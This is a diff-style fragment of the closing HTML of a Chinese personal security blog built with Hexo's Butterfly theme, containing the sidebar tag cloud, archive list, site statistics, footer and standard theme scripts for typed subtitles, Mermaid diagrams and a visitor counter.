+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/" style="font-size: 1.37em; color: #99a4b2">电子数据取证</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.1em; color: #999">代码审计</a> <a href="/tags/Java/" style="font-size: 1.23em; color: #999ea6">Java</a> <a href="/tags/CTF/" style="font-size: 1.37em; color: #99a4b2">CTF</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.5em; color: #99a9bf">渗透测试</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/02/"><span class="card-archive-list-date">二月 2025</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/12/"><span class="card-archive-list-date">十二月 2024</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><span class="card-archive-list-count">2</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">22</div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">45.6k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2025-03-02T11:10:28.968Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By P4tt0n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>window.typedJSFn = {
+  init: (str) => {
+    window.typed = new Typed('#subtitle', Object.assign({
+      strings: str,
+      startDelay: 300,
+      typeSpeed: 150,
+      loop: true,
+      backSpeed: 50,
+    }, "loop"))
+  },
+  run: (subtitleType) => {
+    if (true) {
+      if (typeof Typed === 'function') {
+        subtitleType()
+      } else {
+        btf.getScript('https://cdn.jsdelivr.net/npm/typed.js@2.1.0/dist/typed.umd.min.js').then(subtitleType)
+      }
+    } else {
+      subtitleType()
+    }
+  }
+}
+btf.addGlobalFn('pjaxSend', () => { typed.destroy() }, 'typedDestroy')
+</script><script>function subtitleType () {
+  if (true) {
+    typedJSFn.init(["欢迎来到P4tt0n的小站","遇事不决，埋头就睡。"])
+  } else {
+    document.getElementById("subtitle").textContent = "欢迎来到P4tt0n的小站"
+  }
+}
+typedJSFn.run(subtitleType)</script><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
